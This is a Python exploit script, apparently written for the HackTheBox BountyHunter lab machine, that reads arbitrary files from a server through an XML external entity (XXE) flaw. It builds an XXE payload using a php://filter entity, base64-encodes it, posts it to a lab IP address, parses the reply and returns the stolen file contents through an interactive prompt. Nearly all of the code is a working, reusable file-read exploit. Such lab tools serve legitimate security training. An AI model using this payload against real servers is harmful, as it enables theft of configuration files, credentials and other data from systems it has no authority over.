#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

'''
auth: @cyhfvg https://github.com/cyhfvg
date: 2022/07/03

XXE file getter.

example to show how to get file content by xxe.

require: `pip3 install lxml`

ref:

[hackthebox BountyHunter](https://app.hackthebox.com/machines/359)
[ippsec Safe writeup video](https://www.youtube.com/watch?v=5axsDhumfhU)
[css selecter](https://segmentfault.com/a/1190000016563980)
'''

'''
html example for study soup:

<html><body><p>If DB were ready, would have added:
    </p><table>
    <tr>
    <td>Title:</td>
    <td>a</td>
    </tr>
    <tr>
    <td>CWE:</td>
    <td>b</td>
    </tr>
    <tr>
    <td>Score:</td>
    <td>c</td>
    </tr>
    <tr>
    <td>Reward:</td>
    <td>SGVsbG8gV29ybGQ=</td>
    </tr>
    </table>
    </body></html>
'''

from bs4 import BeautifulSoup
import base64
import cmd
import requests
import sys
import traceback

def isDebug() -> bool:
    return False

def debug_print(msg: str) -> None:
    if isDebug():
        print(msg)

def getFile(fname):
    try:
        # FIXME: change {{{1
        payload = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={fname}"> ]>
            <bugreport>
            <title>a</title>
            <cwe>b</cwe>
            <cvss>c</cvss>
            <reward>&xxe;</reward>
            </bugreport>""".encode()
        #}}}
        payload_b64 = base64.b64encode(payload).decode()

        # do http request
        # FIXME: change {{{1
        data = {"data": payload_b64}
        res = requests.post('http://10.10.11.100/tracker_diRbPr00f314.php', data=data)
        #}}}
        debug_print(res.text)

        # do soup convert
        #soup = BeautifulSoup(res.text, 'html.parser')
        soup = BeautifulSoup(res.text, 'lxml')
        # do soup element select
        result_b64 = soup.select('body > table > tr:nth-child(4) > td + td')[0].string
        debug_print(result_b64)
        result = base64.b64decode(result_b64).decode()
        debug_print(result)
        return result
    except Exception as why:
        if isDebug():
            traceback.print_exc()
        return (f"get content error!")

class XxeLeak(cmd.Cmd):
    print("input file you want to get content.")
    print("'quit' to exit!")

    prompt = "xxe > "
    def default(self, args):
        if args == "quit":
            exit(0)
        print(getFile(args))

if __name__ == '__main__':
    XxeLeak().cmdloop()
